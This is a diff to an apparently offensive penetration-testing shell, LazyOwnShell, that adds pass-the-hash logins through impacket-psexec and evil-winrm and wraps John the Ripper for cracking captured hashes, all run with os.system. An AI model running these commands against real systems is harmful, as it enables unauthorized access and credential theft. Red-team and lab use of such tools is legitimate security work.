@@ -2466,6 +2466,16 @@ class LazyOwnShell(Cmd):
                 os.system(command)
             return
 
+        elif line == "hash":
+            hashs = get_hash()
+            if not hashs:
+                return
+
+            user = input("    [!] Enter Username (default: Administrator)") or 'Administrator'
+            command = f"impacket-psexec {user}@{rhost} -hashes {hashs}"
+            print_msg(command)
+            os.system(command)
+            return
         else:
             command = f"impacket-psexec administrator@{rhost}"
             print_msg(command)
@@ -4378,17 +4388,17 @@ class LazyOwnShell(Cmd):
             - Provide the necessary options as a string argument (e.g., `--format=Raw-SHA512`) if needed.
             - If no options are provided, the function defaults to showing the cracked hashes.
         """
-
+        hashs = get_hash(True)
         wordlist = self.params["wordlist"]
         if not wordlist:
             print_error("wordlist must be set use set wordlist <path_to_wordlist>")
             return
         if line:
             print_msg(f"Try sudo john hash.txt {line}")  
-            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
+            os.system(f"sudo john {hashs} {line}")
         else:
-            print_msg(f"Try john sessions/hash.txt --wordlist={wordlist}")
-            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
+            print_msg(f"Try john {hashs} --wordlist={wordlist}")
+            os.system(f"sudo john {hashs} --wordlist={wordlist}")
         return
 
     def do_hashcat(self, line):
@@ -10281,12 +10291,14 @@ class LazyOwnShell(Cmd):
             if not os.path.exists(hash_txt):
                 print_error(f"No se encontró {hash_txt}.")
                 return
-            with open(hash_txt, "r") as file:
-                for file_line in file:
-                    print(file_line.strip())
-                    command = f"evil-winrm -i {rhost} -u Administrator -H '{file_line.strip()}'"
-                    print_msg(command)
-                    os.system(command)
+            hash_txt = get_hash()
+            if not hash_txt:
+                return
+            
+            user = input("    [!] Enter Username (default: Administrator)") or 'Administrator'
+            command = f"evil-winrm -i {rhost} -u {user} -H '{hash_txt}'"
+            print_msg(command)
+            os.system(command)
             return
         else:
             print_error("Uso incorrecto. Usa 'pass' para autenticar o 'hash' para usar hashes.")
